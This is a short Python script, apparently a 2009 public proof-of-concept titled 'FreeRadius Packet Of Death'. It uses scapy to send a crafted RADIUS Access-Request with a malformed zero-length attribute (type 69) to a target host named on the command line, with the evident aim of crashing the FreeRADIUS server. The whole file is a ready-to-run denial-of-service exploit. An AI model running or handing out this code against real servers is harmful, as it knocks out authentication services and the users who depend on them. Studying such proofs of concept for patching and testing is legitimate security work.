#!/usr/bin/env python
# FreeRadius Packet Of Death
# Matthew Gillespie 2009-09-11
# Requires RadiusAttr http://trac.secdev.org/scapy/attachment/ticket/92/radiuslib.py
# http://www.braindeadprojects.com/blog/what/freeradius-packet-of-death/

import sys
from scapy.all import IP,UDP,send,Radius,RadiusAttr

if len(sys.argv) != 2:
	print "Usage: radius_killer.py <radiushost>\n"
	sys.exit(1)

PoD=IP(dst=sys.argv[1])/UDP(sport=60422,dport=1812)/ \
	Radius(code=1,authenticator="\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99",id=180)/ \
	RadiusAttr(type=69,value="",len=2)

send(PoD)
